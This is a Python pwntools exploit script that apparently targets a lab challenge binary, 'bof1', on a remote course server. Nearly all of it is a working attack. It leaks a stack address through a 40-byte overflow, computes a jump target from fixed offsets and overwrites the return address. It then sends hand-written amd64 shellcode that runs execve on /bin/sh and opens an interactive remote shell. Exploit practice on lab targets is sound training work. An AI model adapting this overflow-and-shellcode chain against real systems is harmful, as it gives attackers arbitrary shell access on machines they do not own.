#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

shellcode = """
xor rax, rax
push rax
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
"""
# 32 byte + return address (16 A, 16 A, return address (msg))
payload = 'A'*40
r.recvuntil(b"name? ")
r.send(payload)

out = r.recvline().strip() 

padding = b'A' * 40
split_position = out.find(padding) + len(padding)
out = out[split_position:]  

out = out.ljust(8, b'\x00')

address = unpack(out, 'all', endian='little')
print(f'Out: {out}\tAddress: {address:#018x}')
address -= 0xa0
address -= 0x8a44
address += 0xd31e0

print(f"new_address: {address:#018x}")
import struct
padding = b"A" * 40

packed_address = struct.pack("<Q", address)

payload = padding + packed_address
print(payload)
r.recvuntil(b"number? ")
r.sendline(payload)
r.recvuntil(b"name? ")
r.sendline(payload)
payload = asm(shellcode)
print(payload)
r.recvuntil(b"message: ")
r.send(payload)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa